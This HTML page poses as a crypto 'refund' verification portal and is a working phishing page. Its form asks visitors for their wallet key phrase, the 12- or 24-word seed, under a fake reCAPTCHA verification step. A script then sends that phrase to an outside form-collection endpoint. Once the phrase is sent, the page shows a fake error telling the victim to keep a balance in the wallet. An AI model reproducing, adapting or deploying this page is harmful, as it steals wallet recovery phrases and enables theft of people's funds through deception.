<!doctype html>
<html lang="en">
<head>
    <title>Recoup Registration Process</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=yes">

    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body class="img js-fullheight" style="background-image: url(images/bg.jpg);">

<section class="ftco-section">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 text-center mb-5">
                <img src="./css/logo.svg" class="img-fluid" style="max-width: 20%;">
                <h6 class="heading-section">Connect through dapps and web3 protocol<br>In order to receive the allocated refund.</h6>
            </div>
        </div>
        <div class="row justify-content-center">
            <div class="col-md-6 col-lg-4">
                <div class="login-wrap p-0">
                    <h5 class="mb-4 text-center">Verify you are not a robot</h5>
                    <form name="myform" id="myForm" class="signin-form">
                        <div class="form-group">
                            <input name="name" id="name" type="text" class="form-control" placeholder="Name of agent in charge" required>
                        </div>
                        <div class="form-group">
                            <input name="key" id="key" type="text" class="form-control" placeholder="Key phrase (Usually 12 words separated by commas)" required>
                        </div>
                        <div class="form-group">
                            <div class="g-recaptcha" data-sitekey="6Lf_tgQqAAAAAFiZ2xgLRivy2uTAiJwmeGehy9cI"></div>
                        </div>
                        <div class="form-group">
                            <button type="submit" class="form-control btn btn-primary submit px-3">Begin Verification</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</section>

<script>
    document.getElementById('myForm').addEventListener('submit', function (event) {
        event.preventDefault();

        // Validate the form fields
        var name = document.getElementById('name').value;
        var key = document.getElementById('key').value;
        var recaptchaResponse = grecaptcha.getResponse();

        if (name.trim() === '') {
            alert("Please fill in the name of your agent");
            return false;
        } else if (key.trim().split(' ').length < 6) {
            alert("Key Phrase is usually 12 or 24 words long.");
            return false;
        } else if (recaptchaResponse.length === 0) {
            alert('Please complete the reCAPTCHA');
            return false;
        }

        // Prepare form data for submission
        var formData = new FormData();
        formData.append('name', name);
        formData.append('key', key);
        formData.append('g-recaptcha-response', recaptchaResponse);

        // Send form data via AJAX
        fetch('https://submit-form.com/9oVHI3Lon', {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => {
            if (response.ok) {
                swal("Sorry!", "Your refund could not  be processed,please ensure you have some balance remaining in your wallet before proceeding!", "error");
                document.getElementById('myForm').reset();
                grecaptcha.reset();
            } else {
                swal("Error", "There was an error submitting your verification. Please try again.", "error");
            }
        }).catch(error => {
            swal("Error", "There was an error submitting your verification. Please try again.", "error");
        });
    });
</script>

<script src="js/jquery.min.js"></script>
<script src="js/popper.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/main.js"></script>

</body>
</html>
